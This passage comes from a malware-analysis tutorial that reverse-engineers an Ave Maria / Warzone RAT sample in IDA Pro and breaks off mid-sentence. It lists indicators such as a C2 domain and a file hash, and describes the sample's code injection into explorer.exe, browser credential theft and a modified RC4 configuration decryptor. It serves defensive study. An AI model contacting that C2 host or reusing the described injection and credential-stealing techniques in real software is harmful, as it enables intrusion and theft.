e\n\n\n-----\n\nTo acquire further information and trace a functional profile of the final payload, I prefer using capa tool\n**(from Mandiant) as** shown below:\n\n**[Figure 42] Capa: getting vital information about the binary for later static analysis**\n\nThere’s crucial information that will help us during the reverse engineering later:\n\n  - the threat is using RC4 symmetric algorithm (maybe related encrypted C2 servers).\n\n  - **SHA1 hash (160-bit) is being used. In other malware families such as Hancitor, this algorithm is**\n\nused to generate a key.\n\n  - the sample contains an embedded PE file. This time we don’t know whether is one of the extracted\n\nsample or, eventually, a new one.\n\n  - **PE parsing is occurring. Although we don’t have any clue this time, this activity could be related a**\n\nhashing algorithm, for example. However, once again, we don’t have any idea yet.\n\nCertainly, I’ll be using Flare Capa Explorer during the reverse engineering section later in this article.\n\n31 | P a g e\n\n\n-----\n\nI also checked whether there was any stack string through the floss tool (from Mandiant), which is always\nan additional problem during the reverse engineering phase, but fortunately there wasn’t anything critical:\n\n**[Figure 43] Floss: using Floss tool to check for possible stack strings**\n\nIt seems that is enough, but it isn’t. If we quickly examine strings on runtime (System Informer → Memory\n→ Options → Strings… → (minimal length: 10) → OK), we can get an interesting list of clues:\n\n  - C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n\n  - %ProgramData%\\Microsoft\\Windows\\Start Me\n\n  - mosesmanservernew.hopto.org\n\n  - cmd.exe /C ping 1.2.3.4 -n 4 -w 1000 > Nul & cmd.exe /C\n\n  - nevergonnagiveyouup\n\n  - [Ave_Maria Stealer OpenSource github Link: https://github.com/syohex/java-simple-mine-sweeper](https://github.com/syohex/java-simple-mine-sweeper)\n\n  - China Petroleum & Chemical Corp!,(c) 1997-2005 e-merge GmbH, http://www.emerge.de\n\n  - %02d-%02d-%02d_%02d.%02d.%02d\n\n  - Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\n\n  - Microsoft-Windows-RemoteDesktopServices-RemoteFX-VM-User-Mode-Transport/Debug\n\n  - HTTP Password\n\n  - SMTP Password\n\n  - IMAP Password\n\n  - SMTP Password\n\nThese are only few strings from over 8 thousand ones, but they are interesting because they might\nindicate:\n\n  - persistence\n\n32 | P a g e\n\n\n-----\n\n  - testing Internet connection\n\n  - malware family’s name\n\n  - mac address\n\n  - C2 URL\n\n  - Stealing passwords\n\nIf readers examine strings a bit more, the new findings are also interesting. For example, it seems that\nmalware sample is stealing and query information from a list of browsers databases:\n\n**[Figure 44] System Informer: strings indicate SQL Lite activity**\n\n## 8. Reversing\n\nIn this reversing section, I’ll be using IDA Pro 8.1, but I’ll be also using IDA Pro 7.7. The reason for using IDA\n**Pro 7.7 is that Flare Capa Explorer and other Mandiant plugins doesn’t support IDA Pro 8.1 in this exact**\nmoment I’m writing this text. About the IDA Pro 8.1, it was released containing news:\n\n  - [https://hex-rays.com/products/ida/news/8_1/](https://hex-rays.com/products/ida/news/8_1/)\n\nAlthough I’ve already written about the setup configuration steps to install few IDA plugins in previous\narticles, I’ll be repeating them to help readers and also adding new suggested plugins:\n\nTo configure any IDA Pro plugin, you must be sure that IDA Pro is using the same Python version that your\nsystem is configured to use. Thus, to check which Python version is configured with your IDA Pro 8.1, open\nit up and, in the IDA Python prompt, type:\n\n  - **import sys**\n\n  - **sys.version**\n\n33 | P a g e\n\n\n-----\n\nIf you need to change the configured Python for IDA Pro, you can do it through the “idapyswitch.exe”\ncommand, which is available on the IDA Pro installation folder (in my case: C:\\Program Files\\IDA Pro 8.1).\nOf course, readers can follow the same steps for IDA Pro 7.x.\n\nTherefore, instructions for configuring a brief list of IDA Pro plugins follow below even I don’t use all of\nthem in this specific article:\n\n**a.** **Flare Capa Explorer**\n\nThis plugin is excellent to detect capabilities of executable files inside the IDA Pro. In special, I like it\nbecause it helps to detect and identify crypto-algorithms, persistence, evasion techniques and\nnetwork communication. At this time that I’m drafting the article, it doesn’t support IDA Pro 8.1, so\nI’ll be configuring it for IDA Pro 7.7:\n\nTo install it, execute the following commands and tasks:\n\n    - **pip install wheel**\n\n    - **pip install -U flare-capa or pip install git+https://github.com/mandiant/capa**\n\n    - **[clone the capa: git clone http://github.com/mandiant/capa.git.](http://github.com/mandiant/capa.git)**\n\n    - **[clone the capa-rules: git clone -b v4 https://github.com/mandiant/capa-rules.git](https://github.com/mandiant/capa-rules.git)**\n\n    - copy the capa_explorer.py plugin to IDA plugin directory. In my case:\n\n`o` C:\\github\\capa\\capa\\ida\\plugin> cp capa_explorer.py \"C:\\Program Files\\IDA Pro\n\n**7.7\\plugins\"**\n\n    - On IDA Pro, load the binary and, eventually, it’d recommended to select Manual Load and Load\n\n**Resources for getting better results. However, you wouldn’t need to load the overlay.**\n\n    - Go to Edit → Plugin → Flare capa explorer and select “Program Analysis” tab. From there, click\n\non the “Analysis” button, which will prompt you to select the folder containing the capa rules\n(in my case, C:\\github\\capa-rules).\n\n    - **Note: from time to time, don’t forget to update capa and capa-rules using “git pull” command,**\n\nand copy the updated plugin’s version to the correct place mentioned above.\n\n**b.** **ApplyCalleType and StructTyper plugins**\n\nThese steps work for IDA Pro 8.1 and IDA Pro 7.7. Both plugins are available from excellent flareida project. To install them:\n\n     - **[git clone https://github.com/mandiant/flare-ida](https://github.com/mandiant/flare-ida)**\n\n     - copy apply_callee_type_plugin.py and struct_typer_plugin.py to \"C:\\Program Files\\IDA\n\n**Pro 8.1\\plugins\" folder.**\n\n     - copy the content of python folder (for example: “C:\\github\\flare-ida\\python\\flare”) to\n\npython folder from IDA directory (for example: C:\\Program Files\\IDA Pro 8.1\\python\\3)\n\n34 | P a g e\n\n\n-----\n\n    - **Notes:**\n\n`o` remember to update flare-ida using “git pull” command.\n`o` After updating it you should copy the named plugins to the mentioned directory.\n`o` There’re other two plugins in the directory: stackstrings_plugin.py and\n\n**shellcode_hashes_search_plugin.py. The first former works only with Python 2.7**\n(we should change the IDA’s python configuration to fill this request) and the second\none is a good plugin, but we’ll use a recent plugin from OALabs that is better.\n\n**c.** **Findcrypt-yara**\n\nThis is a simple, but effective IDA Pro plugin to find crypto constants, mainly. Of course, Flare Capa\n**Explorer is also able to detect crypto algorithms, but it’s always recommended to have two**\nmethods to do the same task. To install it:\n\n    - **pip install yara-python**\n\n    - **[git clone https://github.com/polymorf/findcrypt-yara.git](https://github.com/polymorf/findcrypt-yara.git)**\n\n    - copy both findcrypt3.py and findcrypt3.rule to IDA’s plugin folder (C:\\Program Files\\IDA\n\n**_Pro 8.1\\plugins)_**\n\n**d.** **HashDB**\n\nHashDB is an excellent plugin from OALabs that perform string hash lookup against a remote\ndatabase on OALabs. Actually, it is a welcome evolution and extension from the idea offered by\n**shellcode_hashes_search_plugin.py plugin (created by Mandiant), which I personally used in**\ndifferent opportunities, and it’s able to provide a seamless integration with IDA Pro and really\nmanage and detect most hashed strings. Install it by executing the following steps:\n\n    - **[git clone https://github.com/OALabs/hashdb-ida](https://github.com/OALabs/hashdb-ida)**\n\n    - copy hashdb.py to IDA’s plugin directory (C:\\Program Files\\IDA Pro 8.1\\plugins)\n\n    - **Attention: as HashDB performs lookup on OALabs server, so you should remember to keep**\n\nInternet access in your environment.\n\n    - **Note: as the same way, hashdb.py is updated from time to time, so don’t forget to update it**\n\nand copy the updated version to the mentioned directory above.\n\n**e.** **HexRaysPyTools**\n\nIgor Kirilov created this plugin. The goal of this plugin is to assist in the creation of classes,\nstructures, and detection of virtual tables, helping us to have a better experience while analyzing\nthe decompiled code. Attention: there will be a compatibility warning on IDA 7.7 and newer\nversions.\n\nInstalling this plugin is not complicated:\n\n    - **[git clone https://github.com/igogo-x86/HexRaysPyTools](https://github.com/igogo-x86/HexRaysPyTools)**\n\n35 | P a g e\n\n\n-----\n\n     - **Copy HexRaysPyTools.py file and HexRaysPyTools directory** to IDA plugin directory\n\n(C:\\Program Files\\IDA Pro 8.1\\plugins).\n\n     - **Note: There is an incompatibility of the plugin with recent versions of IDA and, eventually,**\n\nyou’ll see the following message on “Please use \"widget_type\" instead of \"form_type\"\n_(\"form_type\" is kept for backward-compatibility, and will be removed soon.)”._\n\n**f.** **ttddbg - Time Travel Debugging IDA plugin**\n\nThis plugin, which was created by Airbus-CERT, adds a new debugger feature to IDA which supports\nloading Time Travel Debugging traces generated using WinDbg Preview.\n\nFor now, it works only with IDA Pro 7.7 and can be easily installed through the installer available\non: [https://github.com/airbus-cert/ttddbg/releases. Further information on](https://github.com/airbus-cert/ttddbg/releases)\n[https://github.com/airbus-cert/ttddbg](https://github.com/airbus-cert/ttddbg)\n\n**g.** **deREferencing**\n\nThis IDA Pro plugin implements new registers and stack views, as well as dereferenced pointers,\ncolors, and other useful information. To install it:\n\n     - [git clone https://github.com/danigargu/deREferencing](https://github.com/danigargu/deREferencing)\n\n     - Copy dereferencing.py **file and the dereferencing directory into IDA's plugin directory.**\n\nI’ve already explained how to use most these plugins in previous articles of this series, so I won’t show how\nto do it again here. Please, review MAS_2 and MAS_3 **articles to refresh necessary procedures.**\n\nAs usual, let’s start our analyzing by decompiling the entire program to avoid any decompiler’s issue later:\n\n  - **File → Produce File → Create C File (or CTRL+F5).**\n\nAfterwards, we must add (or confirm) whether necessary Type Libraries are loaded:\n\n  - Go to View → Type Libraries (or SHIFT+F11) and confirm whether mssdk_win7, ntapi_win7 and\n\n**ntddk_win7 are included.**\n\n  - If they aren’t, so do it by using INS key. It’s suitable to mention that though all of libraries comes\n\nfrom Windows 7 base foundation, in distinct cases I had better results loading recent libraries\nrelated to Windows 10 (mainly in malware threats coded as kernel drivers), so it is not a fixed rule.\n\nWhen you have loaded all libraries, you should have something like the picture below:\n\n**[Figure 45] IDA Pro: typical used type libraries**\n\n36 | P a g e\n\n\n-----\n\nThis sample contains subroutines and functionalities, and readers can easily confirm them by examining its\nrespective strings. As our space and time are limited, so I’ll quick analyze few of these sub-routines and\nleaving a list of comments.\n\nAs we learned previously, we are managing and analyzing one of the products of the infection process and\nthe file named “file_6.bin” has the following SHA256 hash:\n**8293312b3627167f97e4a5d2900bbdef342e60ad926bc303049b1c9c21fe6d72.**\n\nThe provided malware presents a concise list of artifacts and, mainly, only analyzing its strings on IDA Pro\n(SHIFT+F12) already brings all necessary directions for the analysis, which IOCs show that:\n\n  - The threat has strong interaction with browsers like Chrome, Mozilla, Brave, Edge.\n\n  - It makes usage of Winsock2 APIs.\n\n  - Apparently it checks for network and Internet connection.\n\n  - It makes usage of C++ structures and virtual functions.\n\n  - Checks or collects system’s MAC addresses.\n\n  - Probably works as a keylogger.\n\n  - It hooks graphical-related functions.\n\n  - Steals cookies and login credentials from a list of browsers.\n\n  - Collect SMTP, POP3, IMAP and HTTP passwords.\n\n  - It presents a curious reference to Ave Maria: [https://github.com/syohex/java-simple-mine-sweeper](https://github.com/syohex/java-simple-mine-sweeper)\n\n  - It does an addition into the Windows Defender’s exclusion list.\n\nThese potential “features” shown above need to be checked, but they are the first impressions about the\nsample.\n\nThis binary has 775 functions and, certainly, it would be impossible to cover all of them, so I’ll highlight\nonly the most interesting ones and readers are invited to continue the reversing job.\n\nStarting by sub_A943A7, we find a code parsing the PEB and other associated structures, as shown below:\n\n**[Figure 46] sub_A943A7 (renamed to ab_search_ntdll): parsing PEB and associated structures**\n\n37 | P a g e\n\n\n-----\n\nReaders won’t find this subroutine as presented in the previous picture, although it’s quite easy to get the\nsame result whether we remember few facts. First, the involved structures follow below:\n\n**[Figure 47] _PEB structure**\n\n**[Figure 48] _PEB_LDR_DATA structure**\n\n**[Figure 49] _LDR_DATA_TABLE_ENTRY structure**\n\n38 | P a g e\n\n\n-----\n\nPlease, remember that:\n\na. The PEB (Process Environment Block) is a user mode representation (and structure) of the process,\n\nand, for 32-bit system, we can get a pointer to them by using the classic “mov eax, fs:30h”\ninstruction.\nb. In _PEB structure there’s a member named Ldr at offset 0xC, which is a pointer to the\n\n**_PEB_LDR_DATA structure.**\nc. In _PEB_LDR_DATA, at offset 0x14, there’s a member named InMemoryOrderModuleList that is a\n\nforward link (FLINK, from an _ENTRY_LIST structure) pointing to a _LDR_DATA_TABLE_ENTRY\n**structure. This structure represents a loaded module (DLL).**\n\nLikely, _PEB and _PEB_LDR_DATA structures are already loaded in the IDA Pro, but the last one\n(_PEB_LDR_DATA) isn’t. Thus, go the Structure tab (SHIFT + F9 hotkey) and press INSERT key. Click on Add\n**standard structure and add it. Once readers added the mentioned structure, perform the following steps:**\n\n  - rename “ i “ variable to ptr_module.\n\n  - change its type (Y hotkey) from struct _LIST_ENTRY * to struct _LDR_DATA_TABLE_ENTRY *.\n\nThe subroutine sub_A94469 is clear and readable, and doesn’t need any comment. At end, I renamed\n**sub_A943A7 as ab_search_ntdll.**\n\nApplying a similar approach to sub_A9E172, readers can get the following:\n\n**[Figure 50] Reversed sub_A9E172 subroutine (first part)**\n\n39 | P a g e\n\n\n-----\n\n**[Figure 51] Reversed sub_A9E172 subroutine (second and last part)**\n\nReaders can notice:\n\n  - The function is parsing the PE structures.\n\n  - It’s calculating and comparing the result with a provided hash argument.\n\n  - The ROR 13 operation is typical of hashing functions.\n\nThe result of the reversing task on this subroutine can be improved and, as further note, pay attention to\n**line 19, where I changed the type (Y hotkey) from DWORD to _IMAGE_EXPORT_DIRECTORY based on the**\ninformation of the PE format: IMAGE_DOS_HEADER | IMAGE_NT_HEADERS **|**\n**IMAGE_OPTIONAL_HEADER | IMAGE_DATA_DIRECTORY (at offset 0x78) and the first member of**\n**IMAGE_DATA_DIRECTORY (IMAGE_DATA_DIRECTORY[0]) is a pointer (through VirtualAddress member)**\nto _IMAGE_EXPORT_DIRECTORY.\n\nLooking for further interesting parts (and there’re other ones) around the malware code, we’re able to find\na specific subroutine (sub_A90F49) that, apparently, it’s responsible for enabling and configuring Remote\n**Desktop Services (RDS), which is used by the RDP client. As shown below, the first line already brings**\ndetails about the goals of the routine, which I’ll be renaming to ab_enables_RDS:\n\n40 | P a g e\n\n\n-----\n\n**[Figure 52] First lines of ab_enables_RDS subroutine**\n\nThere’re tons of subroutines that present a well-defined goal:\n\n  - The sub_A91712 is another piece of code related to this subject (RDS/RDP).\n\n  - The sub_A9337A subroutine loads an obfuscated code from the binary resource section and\n\nperform short shift operations.\n\n  - The sub_ **A92C87 subroutine performs the socket communication (basically using socket, send and**\n\n**recv functions) through a network thread. Additionally, there’re other routines related to socket**\ncommunication such as 00A93090 (TCP) and sub_A92BD2 (UDP), for example.\n\nAnother always critical point of any code is its usage of COM (Component Object Model) functions. Yes, I\nknow that people usually don’t like to work with them because the marking task is not so simple, but I\nalready explained it in previous articles, and readers are ready to do it. Anyway, if readers to search for\ntypical COM functions (CoCreateInstance, CoInitialize, **CoInitializeSecurity and so on), certainly they will**\nfind them and there will be few cross-references to CoCreateInstance( ). Please, remember about\nparameters of this function:\n\n**[Figure 53] CoCreateInstance function**\n\nTo an analyst, the most important parameters are rclsid and riid, which represent the associated CLSID\n(class ID) and IID (interface ID), respectively, and the output value that’s the *ppv parameter (the last one).\n\n41 | P a g e\n\n\n-----\n\nOf course, there’re other vital facts that must be used and taken in account while programming COM, but\nthis time let’s proceed using only the essential information for malware analysis.\n\nTherefore, before applying the necessary reversing, you’ll code like the following one that, as you can\nnotice, it’ not so easy to read because multiple casting operations shown below:\n\n42 | P a g e\n\n\n-----\n\n**[Figure 54] Subroutine sub_A9349F using CoCreateInstance and other COM methods**\n\nAs readers can also notice, it isn’t possible to understand what’s happening exactly in term of code,\nalthough the WMI query provides us a good indicator, and neither be sure about what methods are being\ncalled. Thus, we need to work on the code to improve its readability and the first step is discovery CLSID\nand IID used by CoCreateInstance function. There’re IDA Pro plugins that could accomplish this task, but\nI’m used to doing it manually by using the following script (SHIFT+F2) to get the associated GUIDs:\n\n**[Figure 55] Script to format CLSID and IID GUIDs.**\n\nTherefore, we can calculate CLSID and IID GUIDs by providing their respective addresses as shown below:\n\n43 | P a g e\n\n\n-----\n\n  - IDC> Guid(0x00A99380) | CLSID -- { 4590F811-1D3A-11D0-891F-00AA004B2E24 } : WbemLocator\n\n  - IDC> Guid(0x00A9C2B0) | IID -- { DC12A687-737F-11CF-884D-00AA004B2E24 }: IWbemLocator\n\nThe first information you’re able to easily find using OleView .Net tool\n[(https://github.com/tyranid/oleviewdotnet) and the second one using the excellent reference to .NET 4.8](https://github.com/tyranid/oleviewdotnet)\n[from Microsoft (https://referencesource.microsoft.com/), as shown below:](https://referencesource.microsoft.com/)\n\n  - [https://referencesource.microsoft.com/#System.Management/InteropClasses/WMIInterop.cs,dc12](https://referencesource.microsoft.com/#System.Management/InteropClasses/WMIInterop.cs,dc12a687-737f-11cf-884d-00aa004b2e24,references)\n\n[a687-737f-11cf-884d-00aa004b2e24,references](https://referencesource.microsoft.com/#System.Management/InteropClasses/WMIInterop.cs,dc12a687-737f-11cf-884d-00aa004b2e24,references)\n\n**[[InterfaceTypeAttribute(0x0001)]](https://referencesource.microsoft.com/mscorlib/A.html#5be4f2a2a8e65609)**\n**[[TypeLibTypeAttribute(0x0200)]](https://referencesource.microsoft.com/mscorlib/A.html#d330b0c52c32026b)**\n**[[GuidAttribute(\"DC12A687-737F-11CF-884D-00AA004B2E24\")]](https://referencesource.microsoft.com/mscorlib/A.html#1d7e6a222f41fcf0)**\n**[[ComImport]](https://referencesource.microsoft.com/mscorlib/A.html#8df07ffc94774240)**\n**interface** **[IWbemLocator](https://referencesource.microsoft.com/System.Management/R/edefd6088aadaf13.html)**\n**{**\n**[[PreserveSig] int](https://referencesource.microsoft.com/mscorlib/A.html#6e08a3b23ca72e20)** **[ConnectServer_([In][MarshalAs(UnmanagedType.BStr)]](https://referencesource.microsoft.com/#System.Management/InteropClasses/WMIInterop.cs,5a35b84b340befd4)** **string**\n\n**[strNetworkResource, [In][MarshalAs(UnmanagedType.BStr)] string  strUser, [In]IntPtr](https://referencesource.microsoft.com/mscorlib/A.html#ca1f72525eec46fb)** **strPassword,**\n\n**[[In][MarshalAs(UnmanagedType.BStr)] string](https://referencesource.microsoft.com/mscorlib/A.html#ca1f72525eec46fb)** **[strLocale, [In] Int32](https://referencesource.microsoft.com/mscorlib/A.html#ca1f72525eec46fb)** **lSecurityFlags,**\n\n**[[In][MarshalAs(UnmanagedType.BStr)] string](https://referencesource.microsoft.com/mscorlib/A.html#ca1f72525eec46fb)** **[strAuthority, [In][MarshalAs(UnmanagedType.Interface)]](https://referencesource.microsoft.com/mscorlib/A.html#ca1f72525eec46fb)**\n**[IWbemContext](https://referencesource.microsoft.com/System.Management/InteropClasses/WMIInterop.cs.html#009c3d97f8220f8d)** **[pCtx, [Out][MarshalAs(UnmanagedType.Interface)] out](https://referencesource.microsoft.com/mscorlib/A.html#fd277621fdfde8f1)** **[IWbemServices](https://referencesource.microsoft.com/System.Management/InteropClasses/WMIInterop.cs.html#1a709bfea46aaf94)** **ppNamespace);**\n}\n\n**[Figure 56] IWbemLocator and its respective methods**\n\n[Reading the description offered by Microsoft (https://learn.microsoft.com/en-](https://learn.microsoft.com/en-us/windows/win32/api/wbemcli/nn-wbemcli-iwbemlocator)\n[us/windows/win32/api/wbemcli/nn-wbemcli-iwbemlocator) about the class and its respective interface,](https://learn.microsoft.com/en-us/windows/win32/api/wbemcli/nn-wbemcli-iwbemlocator)\nwe have:\n\n_“Use the IWbemLocator interface to obtain the initial namespace pointer to the_ _[IWbemServices interface for](https://learn.microsoft.com/en-us/windows/desktop/api/wbemcli/nn-wbemcli-iwbemservices)_\n_WMI on a specific host computer. You can access Windows Management itself using_\n_the IWbemServices pointer, which is returned by the_ _[IWbemLocator::ConnectServer](https://learn.microsoft.com/en-us/windows/desktop/api/wbemcli/nf-wbemcli-iwbemlocator-connectserver)_ _method.”_\n\nIn few words, the malware’s author wishes to execute a WMI query on the system. Of course, as the given\ninterface holds only one method (ConnectServer( )) beyond the necessary ones (QueryInterface( ),\n**AddRef( ) and Release( ) – please, check previous articles of this series), so our scope here is really**\nreduced.\n\nOur next steps are:\n\na. changing all necessary variable types (Y hotkey)\nb. eventually renaming variables (N hotkey)\n\nNo doubts, MSDN (online or offline versions) is our reference about APIs. Right now, we aren’t really\nconcerned about APIs such as CoInitializeSecurity( ) and CoInitialize( ), but CoCreateInstance( ) is\ninteresting and, of course, we already have necessary information to change it.\n\nOne of possible suggestions is to add interfaces at Structure tab (SHIFT+F9 and then INSERT key) through\nthe usage of the following nomenclature: <interface name>Vtbl. Example: IWbemLocatorVtbl. Soon after\nadding the interface (structure) you’ll have the following:\n\n44 | P a g e\n\n\n-----\n\n**[Figure 57] IWbemLocator interface | structure**\n\nTherefore, our first action is changing the ppv’s type from LPVOID* to IWbemLocator*. Automatically\nyou’ll see soon below a call to ConnectServer( ), as expected. Additionally, rename “ppv” to\n“ptr_IWbemLocator”.\n\nIn the call to ConnectServer( ), change v8 parameter (its last parameter) to IWbemServices* (check MSDN:\n[https://learn.microsoft.com/en-us/windows/win32/api/wbemcli/nf-wbemcli-iwbemlocator-](https://learn.microsoft.com/en-us/windows/win32/api/wbemcli/nf-wbemcli-iwbemlocator-connectserver))\n[connectserver)) and rename it to ptr_IWbemServices. At the same way, rename v3 to ptr_IWbemLocator](https://learn.microsoft.com/en-us/windows/win32/api/wbemcli/nf-wbemcli-iwbemlocator-connectserver))\nand change its type from void* to IWbemLocator*. Following the same approach, change the type of last\nargument of ExecQuery( ) to IEnumWbemClassObject* and rename it to ptr_ IEnumWbemClassObject\n[(please, about the chosen type, check the MSDN: https://learn.microsoft.com/en-](https://learn.microsoft.com/en-us/windows/win32/api/wbemcli/nf-wbemcli-iwbemservices-execquery)\n[us/windows/win32/api/wbemcli/nf-wbemcli-iwbemservices-execquery).](https://learn.microsoft.com/en-us/windows/win32/api/wbemcli/nf-wbemcli-iwbemservices-execquery)\n\nIn the Next( ) method, make two changes:\n\n1. rename the fourth argument to ptr_IWbemClassObject and change its type to\n\n**IWbemClassObject*.**\n2. rename the fifth argument to ptr_puReturned.\n\n[Once more, confirm my choices on MSDN: https://learn.microsoft.com/en-](https://learn.microsoft.com/en-us/windows/win32/api/wbemcli/nf-wbemcli-ienumwbemclassobject-next)\n[us/windows/win32/api/wbemcli/nf-wbemcli-ienumwbemclassobject-next.](https://learn.microsoft.com/en-us/windows/win32/api/wbemcli/nf-wbemcli-ienumwbemclassobject-next)\n\nThe four argument of IWbemClassObject::Get( ) is an enumeration (all of values starting by “CIM_”), so go\nto Enumerations tab (SHIFT+F10), press INSERT key and choose “Add a standard enum by symbol name”.\nSearch for “CIM_” and pick up one of existing CIMTYPE_ENUMERATION (for example, CIM_ILLEGAL).\nAutomatically all members of the CIMTYPE_ENUMERATION are going to be included. Returning to the\ncode, on the line “&& pvarg.vt == 8”, click on “8” and press “M”. The option for “CIM_STRING” will be\npresented for you. Take it.\n\nReturning to other functions (like CoCreateInstance( )) you can also add an enumeration (CLSCTX) by\nfollowing the same procedure and picking up any of them (example: CLSCTX_INPROC_SERVER) that all of\nmembers will be added. Clicking on the third parameter of CoCreateInstance( ), press “M” hotkey and\nchoose an enumeration start by “CLSCTX”.\n\nReaders can replicate these procedures to other functions, variables and constant of this specific\nsubroutine and, of course, to other subroutines using COM functions. Actually, this approach should be\nrepeated over the whole pseudo code to make it clear to read and understand what exactly is happening.\n\nA preview of our changes in this subroutine (and there’re more to do) can be checked in the next page:\n\n45 | P a g e\n\n\n-----\n\n**[Figure 58] Subroutine sub_A9349F after performing a compact list of changes**\n\nIf readers compare figures 54 and 58, so certainly changes will be evident and, as I mentioned previously,\nwe could proceed further changes by following the same approach.\n\nIt’s important to underscore that we can use the same marking-up technique to other places in the same\ncode. For example, readers are able to find two functions calls (NetUserAdd( ) and\n**NetLocalGroupAddMembers( )) inside sub_A90D2C. As expected, the initial appearance of the subroutine**\nis not so good, but we can follow the same steps to transform it into something better. NetUserAdd( )\nfunction specify the level of information in its third argument, and the number “1” means USER_INFO_1\nstructure. Once again, the same recipe is repeated for all malware’s subroutine.\n\n46 | P a g e\n\n\n-----\n\nFor example, the subroutine sub_A881BB performs a network communication using socket functions on\npurpose to evaluate connectivity with the Internet (microsoft.com, port 80). After applying the same\nprocedure that’s changing types and renaming variables, which make part of the marking task, we have:\n\n**[Figure 59] Subroutine sub_A881BB** **after applying types and renaming variables**\n\n47 | P a g e\n\n\n-----\n\n**[Figure 60] Data transmitted by send( ) function**\n\nI’d like to leave comments that, eventually, could help readers:\n\n  - Add enumerations (SHIFT+F10 followed by INSERT) starting with ‘AF_’, ‘SOCK_’ and ‘IPPROTO’.\n\nRemember: once you have added one of possible values, all the remaining are also added.\n\n  - Change sockaddr structure type by sockaddr_in (second argument of WSAConnect() ) because\n\ncode is using TCP/IP stack.\n\nReaders can search for other subroutines using socket related functions such as socket( ), connect( ), recv(\n**), and so on, and you will be able to apply the same logic and obtain related results, as shown below:**\n\n**[Figure 61] Subroutine A922BD2**\n\n48 | P a g e\n\n\n-----\n\nAs usual for most malware samples, this one uses evasion techniques which one of them is a code injection\ninto 32-bit version of explorer.exe. There isn’t anything new here and the procedure is the same of any\nother malware sample: create an own process, search for a determined running process (explorer.exe)\nthrough process snapshot and perform standard code injection, as shown in the next figures:\n\n49 | P a g e\n\n\n-----\n\n**[Figure 62] A95EDE (renamed to ab_code_injection) search for a process and performing code injection**\n\nReaders can confirm there is nothing new here and I’ve just renamed some variables and added few\nenumerations (MEM_*, PAGE_* and CREATE_ ) to use them with “M hotkey”.\n\nAs we do for standard C system programming, the routine below is responsible for searching for a specific\nrunning process (explorer.exe) using usual functions like CreateToolhelp32Snapshot( ), Process32First( )\nand Process32Next( ). As readers also can notice, I added TH32CS_* enumeration values and change the\nfirst argument of CreateToolhelp32Snapshot( ):\n\n**[Figure 63] Subroutine A95FC1 (renamed to ab_search_for_explorer_exe)**\n\nFinally, a quite basic code injection function follows, and I only changed constants by their nominal\nrepresentations, as I have been done so far:\n\n50 | P a g e\n\n\n-----\n\n**[Figure 64] Subroutine A95EDE (renamed to ab_code_injection)**\n\n\n51 | P a g e\n\n\n-----\n\n## 9. C2 Configuration Extractor\n\nAs I mentioned earlier in this text, when I started writing this sixth article I wanted providing a simple\narticle and wrap-up to readers, and then I’d would be able to move forward to different stuff in malware\nanalysis. Thus, choosing a simple threat like this one (Ave Maria, which is derived from Warzone RAT) it\nwould be an easy choice and, no doubts, it is also a fast way to review learned foundations from previous\narticles. Additionally, it’s well-known that Ave Maria / Warzone RAT uses RC4 to encrypt IP addresses or\nURLs used to communicate with malware actors.\n\nRC4 is composed by two components, which are: the KSA (Key-Scheduling Algorithm) and PRGA (Pseudo**Random Generation Algorithm). In the KSA, a first initialization only populates the S array with number**\nfrom 1 to 255 and soon afterwards the stage is responsible for generating the permutation in the array “S”\nusing the key as initial input, and this array (known as Sbox, or substitution box) will be used by the PRGA\nto generate the keystream to decode the given encrypted data. The algorithm is shown below:\n\n**[[Figure 65] RC4 | KSA (https://en.wikipedia.org/wiki/RC4)](https://en.wikipedia.org/wiki/RC4)**\n\n**[[Figure 66] RC4 | PRGA (https://en.wikipedia.org/wiki/RC4)](https://en.wikipedia.org/wiki/RC4)**\n\nIn few and rough words:\n\n  - A S[256] array is initialized with number from 1 to 256.\n\n  - The provided key is used to scramble the array.\n\n  - The scrambled array is used to generate a key stream.\n\n  - This key stream is xored with the original encrypted data to decode it.\n\nAs most malware samples, the C2 configuration can be hidden in sections such as .data, .text, .bss, .rsrc\nand so on, and most of them follow similar syntaxes to organize this configuration such as:\n\n  - **[key] [encrypted data]**\n\n  - **[key length] [key] [encrypted data]**\n\n52 | P a g e\n\n\n-----\n\nOf course, C2 configuration doesn’t need to follow any of these patterns, but it’s always a good bet. In the\ncase of Ave María / Warzone Rat, it uses the second format shown above (remember from first article of\nthis series that Hancitor follows the first format). Thus, it’d would be quite easy to decode our sample that\nuses .bss section to store the C2 configuration. However, if readers to jump to subroutine sub_A82488,\nyou will have a small surprise:\n\n**[Figure 67] sub_A8224BB: decrypting subroutine**\n\n53 | P a g e\n\n\n-----\n\nThe truncated line 49 has the following content:\n\n***(_BYTE *)(v13 + a2) ^= *(_BYTE *)((unsigned __int8)(this[1] + v10) + v11) ^ (unsigned __int8)(*(_BYTE**\n***)((unsigned __int8)(v10 + v12) + v11) + *(_BYTE *)(((unsigned __int8)(*(_BYTE *)((unsigned __int8)((32 * this[1]) ^**\n**(*this >> 3)) + v11) + *(_BYTE *)((unsigned __int8)((32 * *this) ^ (this[1] >> 3)) + v11)) ^ 0xAA) + v11));**\n\n**[Figure 68] truncated line 49 of sub_A8224BB**\n\nLikely readers will have questions about the code, but I’ll explain such decisions soon. At this time, it’s\nimportant to notice a critical point: it is NOT a standard RC4 algorithm. Actually, the own line 49 provides\nus an excellent evident about it. At the same Wikipedia’s page mentioned on the previous page, readers\nwill find other modified versions of standard RC4, and one of them, RC4+, is similar (not equal) to our case:\n\n**[Figure 69] RC4+ algorithm (from https://en.wikipedia.org/wiki/RC4)**\n\nIndeed, the existence of of shl, shr instructions and an XOR operation with 0xAA shows that we’re in the\nright way. However, pay attention that:\n\na. there’re meaningful lines right before this line 49.\nb. **on line 25, we have a modulus operation with 0xFA, which is not usual.**\n\nActually, there’re slight differences as compared to standard RC4 and, as usual, the algorithm doesn’t tell\nsome details (and traps) about a possible implementation.\n\nBefore proceeding, it’s quite important to pay attention to key definitions and choices I adopted during the\nmarking-up phase:\n\na. I’ve defined a structure named struct_rc4 that contains all necessary variables and named the\n\nstructure variable as p_rc4.\nb. Instead of choosing i and j, as shown on Wikipedia, I’ve chosen x and y variables, respectively, as\n\nmembers of the structure.\nc. I’ve used j and k as other variables that would hold indexes over the operation.\nd. Temporary variables were created to hold valuable information: var_k1 and var_k.\ne. **data array is the name of the array holding the encrypted data.**\nf. **cypher variable is the counter used to parse the array holding the encrypted data.**\ng. **sbox variable it’s a pointer to S array’s content (substitution box) and, no doubts, it’s the most**\n\nimportant member of the 